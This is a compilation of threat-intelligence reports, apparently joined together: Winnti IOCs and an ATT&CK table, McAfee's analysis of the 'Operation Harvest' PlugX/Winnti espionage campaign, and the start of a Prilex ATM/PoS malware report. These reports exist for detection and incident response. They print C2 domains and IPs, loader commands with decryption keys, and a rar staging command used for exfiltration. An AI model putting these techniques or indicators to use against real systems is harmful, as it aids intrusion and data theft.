4ad23aae3409c31d3d72e1d10e9d957d a1fa8cad75c5d999f1b0678fa611009572abf03dd5a836f8f2604108b503b6d2 c1af22e0d0585f6c6a2deab22a784717ee33f36d 882a60c3173e252469eb4731af3342bd 37be65842e3fc72a5ceccdc3d7784a96d3ca6c693d84ed99501f303637f9301a 05a2b848965d77fa154ca24fa438b8e5390c21f5 e542c6fabe80af604d31ef8eaaf94053 PlugX 94ea23e7f53cb9111dd61fe1a1cbb79b8bbabd2d37ed6bfa67ba2a437cfd5e92 14c1e3dd30ef1e22e6ebadd65fb883d3e0354d47 329ecc81b222a796f46859d16bd4813c ac5b4378a907949c4edd2b2ca7734173875527e9e8d5b6d69af5aea4b8ed3a69 2293a7510101ccfd83db4bd6429db2f9d406859a d55e9a302203c8800ca89b757b0588ed e54b7d31a8dd0fbab1fa81081e54b0b9b07634c13934adaf08b23d2b6a84b89a c40acafac6c1c3ba1d1cf5497bfaf5f682f9884a a7542a2dc4dd52bd4c9b08741dc32ad7 b59a37f408fcfb8b8e7e001e875629998a570f4a5f652bcbb533ab4d30f243f7 d1cf03da461f81822287465be5942931ac29737d d3ef032a67242789316e364f7e798ff4 ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc 22bac40e845ec6551396b77e6257f50634993883 7affcfb9857cc14dcc07fb8d226f03e0 4dad1e908604c2faa4ad9d9ef3dcebc3a163e97398d41e5e398788fe8da2305b 7cbaa1757bafa3a6be0793b959feac1ea73d88ff f749aa99a08fdc737f90813f174abb30 4a89a4d9fa22f42c6d3e51cf8dca0881e34763fe0448b783599bfc00984fd2ee bd31d8bad119b9da702889b44854b054f15e2f47 4489d5077c5d2396e3a94d652adae1ca 18a14cec1abcb9c02c1094271d89f428dec1896924a949ed760d38cd0dea7217 a2e88dfb93c23ba7cd38a820b2e64f14192079c2 8d6737d573ef70b47fd39a4c5a552e0f Network Indicators LNK file attacks www.comcleanner[.]info 45.76.6[.]149 http://zeplin.atwebpages[.]com/inter.php http://goodhk.azurewebsites[.]net/inter.php http://sixindent.epizy[.]com/inter.php Shellcode injectors 6q4qp9trwi.dnslookup[.]services d89o0gm34t.livehost[.]live d89o0gm35t.livehost[.]live 168.106.1[.]1 149.28.152[.]196 207.148.99[.]56 149.28.84[.]98 Shellcode loaders exchange.dumb1[.]com microsoftbooks.dynamic-dns[.]net microsoftdocs.dns05[.]com ns.microsoftdocs.dns05[.]com ns1.dns-dropbox[.]com ns2.dns-dropbox[.]com ns1.microsoftsonline[.]net ns2.microsoftsonline[.]net ns3.mlcrosoft[.]site onenote.dns05[.]com service.dns22[.]ml update.facebookdocs[.]com 104.224.169[.]214 107.182.24[.]70 107.182.24[.]70 149.248.8[.]134 149.28.23[.]32 176.122.162[.]149 45.76.75[.]219 66.42.103[.]222 66.42.107[.]133 66.42.48[.]186 66.98.126[.]203 FunnySwitch 7hln9yr3y6.symantecupd[.]com db311secsd.kasprsky[.]info doc.goog1eweb[.]com ShadowPad cigy2jft92.kasprsky[.]info update.ilastname[.]com PlugX ns.mircosoftbox[.]com ns.upgradsource[.]com update.upgradsource[.]com 103.79.76[.]205 107.174.45[.]134 10.3 MITRE ID Name Description Reconnaissance T1593.001 Search Open Websites/Domains: Social Media Winnti uses a Twitter account to get game-related information T1594 Search Victim-Owned Websites 
Winnti finds the site of a gaming company and uses information from it to create bait Resource Development T1583.001 Acquire Infrastructure: Domains Winnti purchases domain names that resemble those of legitimate services, including the victim's site T1583.006 Acquire Infrastructure: Web Services Winnti can use GitHub and Google Docs for C2 updates T1587.001 Develop Capabilities: Malware Winnti uses self-developed malware in its attacks T1587.003 Develop Capabilities: Digital Certificates Winnti creates self-signed certificates for use in HTTPS C2 traffic T1588.001 Obtain Capabilities: Malware Winnti uses PlugX in its attacks T1588.002 Obtain Capabilities: Tool Winnti uses Metasploit and Cobalt Strike in its attacks T1588.003 Obtain Capabilities: Code Signing Certificates Winnti steals code signing certificates from compromised organizations T1588.005 Obtain Capabilities: Exploits Winnti uses a public exploit for remote code execution (RCE) by means of a CHM file Initial Access T1566.001 Phishing:
Spearphishing Attachment Winnti sends phishing messages with malicious attachments T1566.002 
Phishing:
Spearphishing Link Winnti sends phishing messages with malicious links Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell Winnti uses cmd.exe and .bat files to run commands T1059.005 Command and Scripting Interpreter: Visual Basic Winnti uses VBS files to pass control to subsequent malware stages T1059.007 Command and Scripting Interpreter: JavaScript/JScript Winnti uses malicious JScript code in intermediate stages and for the payload T1203 Exploitation for Client Execution Winnti exploits RCE in a CHM file by means of an ActiveX object T1106 Native API Winnti uses various WinAPI functions to run malicious shellcode in the current process or to inject it into another process T1204.002 User Execution: Malicious File Winnti tries to make users run malicious .lnk, .chm, and .exe files Persistence T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Winnti persists by means of a registry run key or a startup folder T1543.003 Create or Modify System Process:
Windows Service Winnti persists on infected machines by creating new services T1053.005 Scheduled Task/Job: Scheduled Task Winnti creates a task with schtasks for persistence Defense evasion T1140 Deobfuscate/Decode Files or Information To store shellcode with the payload, Winnti uses a custom PL format with encryption T1574.002 Hijack Execution Flow: DLL Side-Loading Winnti uses legitimate utilities to load DLLs from ShadowPad and PlugX T1562.004 Impair Defenses: Disable or Modify System Firewall FunnySwitch adds allow rules to Windows Firewall for C2 connections T1070 Indicator Removal on Host Paranoid PlugX deletes artifacts created during infection from the file system and registry T1202 Indirect Command Execution Winnti uses intermediate VBS scripts to run .bat
files T1027.002 Obfuscated Files or Information: Software Packing Winnti can use VMProtect or custom packers for its malware T1055.002 Process Injection: Portable Executable Injection Winnti injects shellcode into the processes explorer.exe, winlogon.exe, wmplayer.exe, svchost.exe, and spoolsv.exe T1218.001 Signed Binary Proxy Execution: Compiled HTML File Winnti uses CHM files containing malicious code T1218.004 Signed Binary Proxy Execution: InstallUtil Paranoid PlugX can use InstallUtil to run a malicious .NET assembly T1553.002 Subvert Trust Controls: Code Signing Winnti uses stolen certificates to sign its malware Discovery T1082 System Information Discovery Winnti backdoors collect information about the computer name and OS version and whether it is 32-bit or 64-bit T1016 System Network Configuration Discovery Winnti backdoors collect information about the IP and MAC addresses of the infected machine T1033 System Owner/User Discovery Winnti backdoors collect information about the name of the current user Collection T1119 Automated Collection Winnti backdoors automatically collect information about the infected machine Command and Control T1071.001 Application Layer Protocol: Web Protocols Winnti backdoors can use HTTP/HTTPS for C2 connections T1132.001 Data Encoding: Standard Encoding Winnti uses GZip for compressing FunnySwitch data T1001.003 Data Obfuscation:
Protocol Impersonation Winnti uses FakeTLS in Crosswalk traffic T1573.001 Encrypted Channel:
Symmetric Cryptography Winnti uses AES for encrypting traffic in its backdoors T1008 Fallback Channels The Winnti configuration supports indicating multiple C2 servers of various types T1095 Non-Application Layer
Protocol Winnti backdoors can use TCP and UDP for C2 connections T1090.001 Proxy: Internal Proxy FunnySwitch can establish C2 connections via a peer-to-peer network of infected hosts T1090.002 Proxy: External Proxy Winnti backdoors support C2 connections via an external HTTP/SOCKS proxy T1102.001 Web Service: Dead Drop Resolver Winnti uses Google Docs for updating the C2 address in PlugX 
title: Operation ‘Harvest’: A Deep Dive into a Long-term Campaign url: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ A special thanks to our Professional Services’ IR team, ShadowServer, for historical context on C2 domains, and Thomas Roccia/Leandro Velasco for malware analysis support. 
Executive Summary Following a recent Incident Response, McAfee Enterprise‘s Advanced Threat Research (ATR) team worked with its Professional Services IR team to support a case that initially started as a malware incident but ultimately turned out to be a long-term cyber-attack. 
From a cyber-intelligence perspective, one of the biggest challenges is having information on the tactics, techniques, and procedures (TTPs) an adversary is using and then keeping them up to date.
Within ATR we typically monitor many adversaries for years and collect and store data, ranging from indicators of compromise (IOCs) to the TTPs. 
In this report, ATR provides a deep insight into this long-term campaign where we will map out our findings against the Enterprise MITRE ATT&CK model.
There will be parts that are censored since we respect the confidentiality of the victim.
We will also zoom in and look at how the translation to the MITRE Techniques, historical context, and evidence artifacts like PlugX and Winnti malware led to a link with another campaign, which we highly trust to be executed by the same adversary. 
IOCs that could be shared are at the end of this document. 
McAfee customers are protected from the malware/tools described in this blog.
MVISION Insights customers will have the full details, IOCs and TTPs shared via their dashboard.
MVISION Endpoint, EDR and UCE platforms provide signature and behavior-based prevention and detection capability for many of the techniques used in this attack.
A more detailed blog with specific recommendations on using the McAfee portfolio and integrated partner solutions to defend against this attack can be found here. 
Technical Analysis Initial Infection Vectors [TA0001] Forensic investigations identified that the actor established initial access by compromising the victim’s web server [T1190].
On the webserver, software was installed to maintain the presence and storage of tools [T1105] that would be used to gather information about the victim’s network [T1083] and lateral movement/execution of files [T1570] [T1569.002].
Examples of the tools discovered are PSexec, Procdump, and Mimikatz. 
Privilege Escalation and Persistence [TA0004, TA0003] 
The adversary has been observed using multiple privilege escalation and persistence techniques during the period of investigation and presence in the network.
We will highlight a few in each category. 
Besides the use of Mimikatz to dump credentials, the adversaries used two tools for privilege escalations [T1068].
One of the tools was “RottenPotato”.
This is an open-source tool that is used to get a handle to a privileged token, for example, “NT AUTHORITY\SYSTEM”, to be able to execute tasks with System rights. 
Example of RottenPotato on elevating these rights: Figure 1 RottenPotato The second tool discovered, “BadPotato”, is another open-source tool that can be used to elevate user rights towards System rights. 
Figure 2 BadPotato 
The BadPotato code can be found on GitHub where it is offered as a Visual Studio project.
We inspected the adversary’s compiled version using DotPeek and hunted for artifacts in the code.
Inspecting the File (COFF) header, we observed the file’s compilation timestamp: 
TimeDateStamp: 05/12/2020 08:23:47 – Date and time the image was created PlugX Another major and characteristic privilege escalation technique the adversary used in this long-term campaign was the malware PlugX as a backdoor.
PlugX makes use of the technique “DLL Sideloading” [T1574.002].
PlugX was observed as usual where a single (RAR) executable contained the three parts: Valid executable. 
Associated DLL with the hook towards the payload. 
Payload file with the config to communicate with Command & Control Server (C2). 
The adversary used either the standalone version or distributed three files on different assets in the network to gain remote control of those assets.
The samples discovered and analyzed were communicating towards two domains.
Both domains were registered during the time of the campaign. 
One of the PlugX samples consisted of the following three parts: Filename Hashes HPCustPartic.exe SHA256: 8857232077b4b0f0e4a2c3bb5717fd65079209784f41694f8e1b469e34754cf6 HPCustPartUI.dll SHA256: 0ee5b19ea38bb52d8ba4c7f05fa1ddf95a4f9c2c93b05aa887c5854653248560 HPCustPartic.bin SHA256:
008f7b98c2453507c45dacd4a7a7c1b372b5fafc9945db214c622c8d21d29775 The .exe file is a valid and signed executable and, in this case, an executable from HP (HP Customer participation).
We also observed other valid executables being used, ranging from AV vendors to video software.
When the executable is run, the DLL next to it is loaded.
The DLL is valid but contains a small hook towards the payload which, in our case, is the .bin file.
The DLL loads the PlugX config and injects it into a process. 
We executed the samples in a test setup and dumped the memory of the machine to conduct memory analysis with volatility.
After the basic forensically sound steps, we ran the malfind plugin to detect possible injected code in a process.
From the redacted output of the plugin, we observed the following values for the process with possible injected code: Process: svchost.exe Pid: 860 Address: 0xb50000 Process: explorer.exe Pid: 2752 Address: 0x56a000 Process: svchost.exe Pid: 1176
Address: 0x80000 Process: svchost.exe Pid: 1176 Address: 0x190000 Process: rundll32.exe
Pid: 3784 Address: 0xd0000 Process: rundll32.exe
Pid: 3784 Address: 0x220000 One observation is the mention of the SVCHOST process with a ProcessID value of 1176 that is mentioned twice but with different addresses.
This is similar to the RUNDLL32.exe that is mentioned twice with PID 3785 and different addresses.
One way to identify what malware may have been used is to dump these processes with the relevant PID using the procdump module, upload them to an online analysis service and wait for the results.
Since this is a very sensitive case, we took a different approach.
Using the best of both worlds (volatility and Yara) we used a ruleset that consists of malware patterns observed in memory over time.
Running this ruleset over the data in the memory dump revealed the following (redacted for the sake of readability) output: Figure 3 Output Yarascan memory dump 
The output of the Yara rule scan (and there was way more output) confirmed the presence of PlugX module code in PID 1176 of the SVCHOST service.
Also, the rule was triggered on PID 3784, which belonged to RUNDLL32.exe. 
Investigating the dumps after dynamic analysis, we observed two domain names used for C2 traffic: sery.brushupdata.com dnssery.brushupdata.com In particular, we saw the following hardcoded value that might be another payload being downloaded: sery.brushupdata.com/CE1BC21B4340FEC2B8663B69 
The PlugX families we observed used DNS [T1071.001]
[T1071.004] as the transport channel for C2 traffic, in particular TXT queries.
Investigating the traffic from our samples, we observed the check-in-signature (“20 2A 2F 2A 0D”) that is typical for PlugX network traffic: 00000000: 47 45 54 20 2F 42 34 42 42 44 43 43 30 32 39 45 00000010: 
31 31 39 37 31 39 46 30 36 35 36 32 32 20 48 54 00000020: 54 50 2F 31 2E 31 0D 0A 41 63 63 65 70 74 3A 20 00000030: 2A 2F 2A 0D 0A 43 6F 6F 6B 69 65 3A 20 44 36 43 00000040: 57 50 2B 56 5A 47 6D 59 6B 6D 64 6D 64 64 58 55 00000050: 71 58 4D 31 71 31 6A 41 3D 0D 0A 55 73 65 72 2D During our analysis of the different PlugX samples discovered, the domain names as mentioned above stayed the same, though the payload values were different.
For example: hxxp://sery.brushupdata.com/B4BBDCC029E119719F065622 hxxp://sery.brushupdata.com/07FDB1B97D22EE6AF2482B1B hxxp://sery.brushupdata.com/273CDC0B9C6218BC1187556D Other PlugX samples we observed injected themselves into Windows Media Player and started a connection with the following two domains: center.asmlbigip.com sec.asmlbigip.com 
Hello Winnti Another mechanism observed was to start a program as a service
[T1543.003] on the Operating System with the acquired System rights by using the *Potato tools.
The file the adversary was using seemed to be a backdoor that was using the DLL file format (2458562ca2f6fabddae8385cb817c172). 
The DLL is used to create a malicious service and its name is “service.dll”.
The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.
The dll is run using the command “rundll32.exe SuperFrtch.dll, #1”.
The export function has the name “WwanSvcMain”. 
The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.
It appears that the dll employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more difficult.
The DLL embeds several obfuscated strings decoded when running.
Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.
A description of the technique can be found here. 
The malware also decrypts and injects the payload in memory.
The following screenshot shows the decryption routine. 
Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.
The malware described in the article is attributed to the Winnti malware family.
The operating method and the code used in the DLL described in the article are very similar to our analysis and observations. 
The process dump also revealed further indicators.
Firstly, it revealed artifacts related to the DLL analyzed, “C:\ProgramData\Microsoft\Windows\SuperfRtch\SuperfRtch.dat”.
We believe that this dat file might be the loaded payload. 
Secondly, while investigating the process dump, we observed activities from the backdoor that are part of the data exfiltration attempts which we will describe in more detail in this analysis report. 
A redacted snippet of the code would look like this: Creating archive ***.rar Adding 
[data from location] 0% OK Another indicator of discovering Winnti malware was the following execution path we discovered in the command line dump of the memory: 
cmd /c
klcsngtgui.exe 1560413F7E <abbreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).
In this case, the payload file was named using an abbreviation of the victim company’s name.
Unfortunately, the adversary had removed the payload file from the system.
File carving did not work since the disk/unallocated space was overwritten.
However, reconstructing traces from memory revealed that we were dealing with the Winnti 4.0 malware.
The malware was injected into a SVCHOST process where a driver location pointed to the config file.
We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc. 
Another clue that helped us was the use of DNS tunneling by Winnti which we discovered traces of in memory.
The hardcoded 208.67.222.222 resolves to a legitimate OpenDNS DNS server.
The IP is pushed into the list generated by the malware at runtime. 
At the start of the malware, it populates the list with the system’s DNS, and the OpenDNS server is only used as a backup to ensure that the C2 domain is resolved. 
Another indicator in the process dump was the setup of the C2 connection including the User-Agent that has been observed being used by Winnti 4.0 malware: 
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/57.0.2987.133 Safari/537.36 Other Persistence Activities WMI activity [T1546.003] was also observed to execute commands on the systems. 
From a persistence point of view, scheduled tasks [T1053.005] and the use of valid accounts [T1078] acquired through the use of Mimikatz, or creating LSASS dumps, were observed being employed during the length of the campaign. 
Lateral Movement From a lateral movement perspective, the adversary used the obtained credentials to hop from asset to asset.
In one particular case, we observed a familiar filename: “PsExec.exe”.
This SysInternals tool is often observed being used in lateral movement by adversaries, however, it can also be used by the sysadmins of the network.
In our case, the PsExec executable had a file size of 9.6 MB where the original PsExec (depending on 32- or 64-bit version) had a maximum file size of 1.3 MB.
An initial static inspection of the file resulted in a blob of code that was present in the executable which had a very high entropy score (7.99).
When running the file from the command line, the following output was observed: Figure 5 PsExec output The error notification and the ‘Impacket’ keyword tipped us off and, after digging around, we found more.
The fake PsExec is an open-source Python script that is a PsExec alternative with shell/backdoor capability.
It uses a script from this location: hxxps://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.pyi.
The file is large since it incorporates a low-level protocol interaction from Impacket.
The Python library combined with the script code is compiled with py2exe.
The file was compiled during the time of the latest attack activities and signed with an expired certificate. 
Data Exfiltration From what we observed
, the adversary had a long-term intention to stay present in the victim’s network.
With high confidence, we believe that the adversary was interested in stealing proprietary intelligence that could be used for military or intellectual property/manufacturing purposes. 
The adversary used several techniques to exfiltrate the data.
In some cases, batch (.bat) scripts were created to gather information from certain network shares/folders and use the ‘rar’ tool to compress them to a certain size [T1020]
[T1030].
Example of content in a batch script: C:\Windows\web\rar.exe a -[redacted] -r -v50000
[Target-directory] On other occasions, manual variants of the above command were discovered after using the custom backdoor as described earlier. 
When the data was gathered on a local system using the backdoor, the files were exfiltrated over the backdoor and the rar files were deleted [T1070.004].
Where external facing assets were used, like a web server, the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths [T1041] [T1567] [T1071]. 
An example of the [redacted] web traffic in the IIS logfiles: Date /Time Request TCP Src port Source IP User-Agent Redacted GET /****/[redacted].rar 80 180.50.
*.* MINIXL redacted GET /****/[redacted].rar 80 209.58.
*.* MINIXL The source IP addresses discovered belonged to two different ISP/VPN providers based in Hong-Kong. 
The User-Agent value is an interesting one, “MINIXL”.
When we researched that value, we discovered a blog from Dell SecureWorks from 2015 that mentions the same User-Agent, but also a lot of the artifacts mentioned from the blog overlapped with the observations and TTPs of Operation Harvest [link]. 
What we could retrieve from open-source databases is that the use of this particular User-Agent is very limited and seems to originate from the APAC region. 
Who did it? 
That seems to be the one-million-dollar question to be asked.
Within McAfee, attribution is not our main focus, protecting our customers is our priority.
What we do care about is that if we learn about these techniques during an investigation, can we map them out and support our IR team on the ground, or a customer’s IR team, with the knowledge that can help determine which phase of the attack the evidence is pointing to and based on historical data and intelligence, assist in blocking the next phase and discover more evidence? 
We started by mapping out all MITRE ATT&CK Enterprise techniques and sub-techniques, added the tools used, and did a comparison against historical technique data from the industry.
We ended up with four groups that shared techniques and sub-techniques.
The Winnti group was added by us since we discovered the unique encryption function in the custom backdoor and indicators of the use of the Winnti malware. 
Figure 6 ATT&CK technique comparison The diagram reflecting our outcome insinuated that APT27 and APT41 are the most likely candidates that overlap with the (sub-)techniques we observed. 
Since all these groups are in a certain time zone, we extracted all timestamps from the forensic investigation with regards to: Registration of domain Compile timestamps of malware (considering deception) Timestamps of command-line activity Timestamps of data exfiltration Timestamps of malware interaction such as creation, deletion, etc. 
When we converted all these timestamps from UTC to the aforementioned groups’ time zones, we ended up with the below scheme on activity: Figure 7 Adversary’s time of operation In this campaign, we observed how the adversary mostly seems to work from Monday to Thursday and typically during office hours, albeit with the occasional exception. 
Correlating ATT&CK (sub-)techniques, timestamps, and tools like PlugX and Mimikatz are not the only evidence indicators that can help to identify a possible adversary.
Command-line syntax, specific code similarity, actor capability over time versus other groups, and unique identifiers are at the top of the ‘pyramid of pain’ in threat intelligence.
The bottom part of the pyramid is about hashes, URLs, and domains, areas that are very volatile and easy to change by an adversary. 
Figure 8 Pyramid of Pain Beyond investigating those artifacts, we also took possible geopolitical interests and potential deception into consideration when building our hypothesis.
When we mapped out all of these, we believed that one of the two previously mentioned groups were responsible for the campaign we investigated. 
Our focus was not about attribution though, but more around where the flow of the attack is, matches against previous attack flows from groups, and what techniques/tools they are using to block next steps, or where to locate them.
The more details we can gather at the top of ‘the pyramid of pain’, the better we can determine the likely adversary and its TTP’s. 
That’s all Folks! 
Well, not really.
While correlating the observed (sub-)techniques, the malware families and code, we discovered another targeted attack against a similar target in the same nation with the major motivation of gathering intelligence.
In the following diagram we conducted a high-level comparison of the tools being used by the adversary: Figure 9 Tools comparison Although some of the tools are unique to each campaign, if taken into consideration over time with when they were used, it makes sense.
It demonstrates the development of the actor and use of newer tools to conduct lateral movement and to obtain the required level of user rights on systems. 
Overall, we observed the same modus operandi.
Once an initial foothold was established, the adversary would deploy PlugX initially to create a few backdoors in the victim’s network in case they were discovered early on.
After that, using Mimikatz and dumping lsass, they were looking to get valid accounts.
Once valid accounts were acquired, several tools including some of their own tools were used to gain information about the victim’s network.
From there, several shares/servers were accessed, and information gathered.
That information was exfiltrated as rar files and placed on an internet-facing server to hide in the ‘normal’ traffic.
We represent that in the following graphic: Figure 10 Attack flow In the 2019/2020 case we also observed the use of a malware sample that we would classify as part of the Winnti malware family.
We discovered a couple of files that were executed by the following command: Start Ins64.exe E370AA8DA0 Jumper64.dat 
The Winnti loader ‘Ins64.exe’ uses the value ‘E370AA8DA0’ to decrypt the payload from the .dat file using the AES-256-CTR decryption algorithm and starts to execute. 
After executing this command and analyzing the memory, we observed a process injection in one of the svchost processes whereby one particular file was loaded from the following path: C:\programdata\microsoft\windows\caches\ieupdate.dll Figure 11
Memory capture The malware started to open up both UDP and TCP ports to connect with a C2 server. 
UDP Port 20502 TCP Port 20501 Figure 12 Network connections to C2 Capturing the traffic from the malware we observed the following as an example: Figure 13 Winnti HTTP traffic to C2 The packet data was customized and sent through a POST request with several headers towards the C2.
In the above screenshot the numbers after “POST /” were randomly generated. 
The User-Agent is a good network indicator to identify the Winnti malware since it is used in multiple variants: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36 Indeed, the same User Agent value was discovered in the Winnti sample in Operation Harvest and seems to be typical for this malware family. 
The cookie value consists of four Dword hex values that contain information about the customized packet size using a XOR value. 
We learned more about the packet structure of Winnti from this link. 
Applying what we learned about the handshake, we observed the following in our traffic sample: Dword value 0
= 52 54 00 36 Dword value 1 = 3e ff 06 b2 Dword value 2 = 99 6d 78 fe Dword value 3 = 08 00
45 00 Dword value 4 = 00 34 00 47 Initial handshake order: Based on our cross-correlation with samples and other OSINT resources, we believe with a high confidence that this was a Winnti 4.0 sample that connects with a confirmed Winnti C2 server. 
The identified C2 server was 185.161.211.97 TCP/80. 
Timeline of Events When analyzing the timestamps from this investigation, like we did for operation Harvest, we came to the below overview: Figure 14 Beijing working hours case 2019/2020 Again, we observed that the adversary was operating Monday to Friday during office hours in the Beijing time-zone. 
Conclusion Operation Harvest has been a long-term operation whereby an adversary maintained access for multiple years to exfiltrate data.
The exfiltrated data would have either been part of an intellectual property theft for economic purposes and/or would have provided insights that would be beneficial in case of military interventions.
The adversaries made use of techniques very often observed in this kind of attack but also used distinctive new backdoors or variants of existing malware families.
Combining all forensic artifacts and cross-correlation with historical and geopolitical data, we have high confidence that this operation was executed by an experienced APT actor. 
After mapping out all data, TTP’s etc., we discovered a very strong overlap with a campaign observed in 2019/2020.
A lot of the (in-depth) technical indicators and techniques match.
Also putting it into perspective, and over time, it demonstrates the adversary is adapting skills and evolving the tools and techniques being used. 
On a separate note, we observed the use of the Winnti malware.
We deliberately mention the term ‘malware’ instead of group.
The Winnti malware is known to be used by several actors.
Within every nation-state cyber-offensive activity, there will be a department/unit responsible for the creation of the tools/malware, etc.
We strongly believe that is exactly what we observe here as well.
PlugX, Winnti and some other custom tools all point to a group that had access to the same tools.
Whether we put name ‘X’ or ‘Y’ on the adversary, we strongly believe that we are dealing with a Chinese actor whose long-term objectives are persistence in their victims’ networks and the acquisition of the intelligence needed to make political/strategic or manufacturing decisions. 
MITRE ATT&CK Techniques Technique ID Technique Title Context Campaign T1190 Exploit Public-facing application Adversary exploited a web-facing server with application T1105 Ingress Tool transfer Tools were transferred to a compromised web-facing server T1083 File & Directory Discovery Adversary browsed several locations to search for the data they were after. 
T1570 Lateral Tool Transfer Adversary transferred tools/backdoors to maintain persistence T1569.002 System Services: Service Execution Adversary installed custom backdoor as a service T1068 
The exploitation of Privilege Escalation Adversary used Rotten/Bad Potato to elevate user rights by abusing API calls in the Operating System. 
T1574.002 Hijack Execution Flow: DLL Side-Loading Adversary used PlugX malware that is famous for DLL-Side-Loading using a valid executable, a DLL with the hook towards a payload file. 
T1543.003 Create or Modify System Process: Windows Service Adversary launched backdoor and some tools as a Windows Service including adding of registry keys T1546.003 Event-Triggered Execution: WMI Event Subscription WMI was used for running commands on remote systems T1053.005 Scheduled task Adversary ran scheduled tasks for persistence of certain malware samples T1078 Valid accounts Using Mimikatz and dumping of lsass, the adversary gained credentials in the network T1020 Automated exfiltration The PlugX malware exfiltrated data towards a C2 and received commands to gather more information about the victim’s compromised host. T1030 Data transfer size limits Adversary limited the size of rar files for exfiltration T1070.004 Indicator removal on host Where in the beginning of the campaign the adversary was sloppy, during the last months of activity they became more careful and started to remove evidence T1041 Exfiltration over C2 channel Adversary used several C2 domains to interact with compromised hosts. 
T1567 Exfiltration over Web Service Gathered information was stored as ‘rar’ files on the internet-facing server, whereafter they were downloaded by a specific ip range. 
T1071.004 Application layer protocol: DNS Using DNS tunneling for the C2 traffic of the PlugX malware Indicators of Compromise (IOCs) Note: the indicators shared are to be used in a historical and timeline-based context, ranging from 2016 to March 2021. 
Operation Harvest: PlugX C2: sery(.)brushupdata(.)com Dnssery(.)brushupdata(.)com Center(.)asmlbigip(.)com Tools: Mimikatz PsExec RottenPotato BadPotato Operation 2019/2020 PlugX malware: f50de0fae860a5fd780d953a8af07450661458646293bfd0fed81a1ff9eb4498 26e448fe1105b5dadae9b7607e3cca366c6ba8eccf5b6efe67b87c312651db01 e9033a5db456af922a82e1d44afc3e8e4a5732efde3e9461c1d8f7629aa55caf 3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe Winnti: 800238bc27ca94279c7562f1f70241ef3a37937c15d051894472e97852ebe9f4 c3c8f6befa32edd09de3018a7be7f0b7144702cb7c626f9d8d8d9a77e201d104 df951bf75770b0f597f0296a644d96fbe9a3a8c556f4d2a2479a7bad39e7ad5f Winnti C2: 185.161.211.97 Tools: PSW64 6e983477f72c8575f8f3ff5731b74e20877b3971fa2d47683aff11cfd71b48c6 NTDSDumpEx 6db8336794a351888636cb26ebefb52aeaa4b7f90dbb3e6440c2a28e4f13ef96 NBTSCAN c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e NetSess ddeeedc8ab9ab3b90c2e36340d4674fda3b458c0afd7514735b2857f26b14c6d Smbexec e781ce2d795c5dd6b0a5b849a414f5bd05bb99785f2ebf36edb70399205817ee Wmiexec 14f0c4ce32821a7d25ea5e016ea26067d6615e3336c3baa854ea37a290a462a8 Mimikatz RAR command-line TCPdump The post Operation ‘Harvest’: A Deep Dive into a Long-term Campaign appeared first on McAfee Blog. 
title: Prilex: Brazilian PoS malware evolution url: https://securelist.com/prilex-atm-pos-malware-evolution/107551/ Prilex is a Brazilian threat actor that has evolved out of ATM-focused malware into modular point-of-sale malware.
The group was behind one of the largest attacks on ATMs in the country, infecting and jackpotting more than 1,000 machines, while also cloning in excess of 28,000 credit cards that were used in these ATMs before the big heist.
But the criminals’ greed had no limits: they wanted more, and so they achieved it. 
Active since 2014, in 2016, the group decided to give up ATM malware and focus all of their attacks on PoS systems, targeting the core of the payment industry.
These are criminals with extensive knowledge of the payment market, and EFT software and protocols.
They quickly adopted the malware-as-a-service model and expanded their reach abroad, creating a toolset that included backdoors, uploaders and stealers in a modular fashion.
Since then, we have been tracking the threat actor’s every move, witnessing the damages and great financial losses they brought upon the payments industry. 
The Prilex PoS malware evolved out of a simple memory scraper into very advanced and complex malware, dealing directly with the PIN pad hardware protocol instead of using higher level APIs, doing real-time patching in target software, hooking operating system libraries, messing with replies, communications and ports, and switching from a replay-based attack to generate cryptograms for its GHOST transactions even from credit cards protected with CHIP and PIN technology. 
It all started with ATMs during a carnival celebration During the carnival of 2016, a Brazilian bank realized that their ATMs had been hacked, with all the cash contained in those machines stolen.
According to reports from law enforcement agencies, the criminals behind the attack were able to infect more than 1,000 machines belonging to one bank in the same incident, which allowed them to clone 28,000 unique credit cards across Brazil. 
The attackers did not have physical access to the machines, but they were able to access the bank’s network by using a DIY device containing a 4G router and a Raspberry PI.
By opening a backdoor, they were able to hijack the institution’s wireless connection and target ATMs at will.
After obtaining initial network access, the attacker would run a network recognition process to find the IP address of each of the ATMs.
With that information in hand, the attackers would launch a lateral movement phase, using default Windows credentials and then installing custom-crafted malware in the desired systems.
The backdoor would allow the attacker to empty the ATM socket by launching the malware interface and typing a code supplied by the mastermind, the code being specific to each ATM being hacked. 
ATM infected with Prilex ready to dispense money The malware used in the attack was named Prilex and had been developed from scratch by using privileged information and advanced knowledge of the ATM network.
To control the ATMs, Prilex did patch in legitimate software for jackpotting purposes.
Besides its capability to perform a jackpot, the malware was also capable of capturing information from magnetic strips on credit and debit cards inserted into the infected ATMs.
Afterwards, this valuable information could be used to clone cards and steal further funds from the bank’s clients. 
Evolving into PoS malware Prilex has evolved out of ATM-focused malware into modular point-of-sale malware targeting payment systems developed by Brazilian vendors, the so-called EFT/TEF software.
As we noted in 2018, there are many similarities between their ATM and PoS versions.
